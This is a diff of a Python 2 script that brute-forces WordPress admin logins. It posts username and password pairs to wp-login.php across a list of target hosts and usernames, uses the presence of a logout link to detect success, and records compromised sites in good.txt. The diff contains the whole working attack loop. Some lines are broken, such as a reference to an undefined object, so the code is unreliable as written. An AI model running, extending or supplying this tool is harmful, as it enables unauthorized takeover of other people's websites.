@@ -26,15 +26,21 @@ file.close()
 #theard_count = 5
 def brut(host, login, pwd):
     url = 'http://'+host+'/wp-login.php'
-    payload = {'log': login, 'pwd': pwd}
+    try:
+        response_get = requests.get(url)
+    except Exception:
+        print 'Host have error'
+    payload = {'log': login, 'pwd': pwd, 'wp-submit': 'Log In', 'redirect_to': 'http://'+host+'/wp-admin/', 'testcookie': '1'}
     print url
-    print login+pwd
+    print login+'--'+pwd
     try:
         response = requests.post(url, data=payload, headers=headers, timeout = 10)
+        print x.requests.headers['Cookie']
+        #print response.text
     except Exception:
         return False
         print 'Find ERROR'
-    if response.text.find('error')<0:
+    if response.text.find('action=logout')>0:
         return True
     else:
         return False
@@ -57,20 +63,18 @@ def brut(host, login, pwd):
                     return True
                 else:
                     return False'''
-if brut('demos1.softaculous.com/WordPress', "admin", "pass"):
-    print '1'
-else:
-    print '0'
-'''for i in range(len(d_list)):
+for i in range(len(d_list)):
     url = d_list[i].strip()
-    try:
-        if brut(url):
-            print(url+' find admin')
-            open('good.txt', 'a+').write(url + '\n')
-        else:
-            print('0')
-    except Exception:
-        print('error')'''
+    for i in range(len(l_list)):
+        login = l_list[i].strip()    
+        try:
+            if brut(url, login, 'pass'):
+                open('good.txt', 'a+').write(url + '\n')
+                print '1'
+            else:
+                print '0'
+        except Exception:
+            print 'error'
 '''def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
